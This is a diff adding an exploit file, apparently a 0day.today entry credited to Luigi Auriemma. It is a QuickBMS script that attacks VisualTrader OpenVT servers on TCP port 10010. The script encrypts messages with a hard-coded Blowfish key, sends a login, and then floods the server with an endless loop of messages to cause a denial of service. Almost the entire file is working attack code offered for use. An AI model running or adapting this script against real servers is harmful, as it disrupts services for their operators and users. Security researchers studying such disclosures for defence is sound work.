@@ -1,0 +1,60 @@
+id: 18887
+date: 07/01/2012
+title: VisualTrader OpenVT lame Denial of Service
+author: Luigi Auriemma
+cves: 
+
+# VisualTrader OpenVT lame Denial of Service
+# quickbms -n openvt_dos.bms "tcp://SERVER:10010" .
+# script for Quickbms http://quickbms.aluigi.org
+
+get SERVER fullname
+set KEY string "3jds894jsnwmtod0295jdhbtr5bv789dsjkerk59fjq2k39fklwo04dm"
+
+set MEMORY_FILE binary "10|full_program_name|username|password|"
+callfunction OPENVT_SEND
+
+# Denial of Service
+for
+    set MEMORY_FILE binary "1|1|1|program_exe|description|version|1"
+    callfunction OPENVT_SEND
+next
+
+for
+    callfunction OPENVT_RECV
+next
+
+startfunction OPENVT_SEND
+    get SIZE asize MEMORY_FILE
+    #goto 0 MEMORY_FILE
+    #getdstring DATA SIZE MEMORY_FILE
+    #print "SEND: %DATA%"
+    math SIZE x= 8
+    putvarchr MEMORY_FILE SIZE 0
+
+    encryption bf_cbc KEY "" 1
+    log MEMORY_FILE 0 SIZE MEMORY_FILE
+    encryption "" ""
+
+    string TMP p= "#%07x" SIZE
+    putdstring TMP 8
+    log SERVER 0 SIZE MEMORY_FILE
+    put 0x0d byte
+    put 0x0a byte
+endfunction
+
+startfunction OPENVT_RECV
+    getdstring SIZE 8
+    putvarchr SIZE 0 0x24
+    getdstring DATA SIZE
+    getdstring TMP 2
+    encryption bf_cbc KEY ""
+    string DATA E= DATA
+    encryption "" ""
+    strlen SIZE DATA
+    print "RECV: %DATA%"
+endfunction
+
+
+
+#  0day.today [2023-03-27]  #
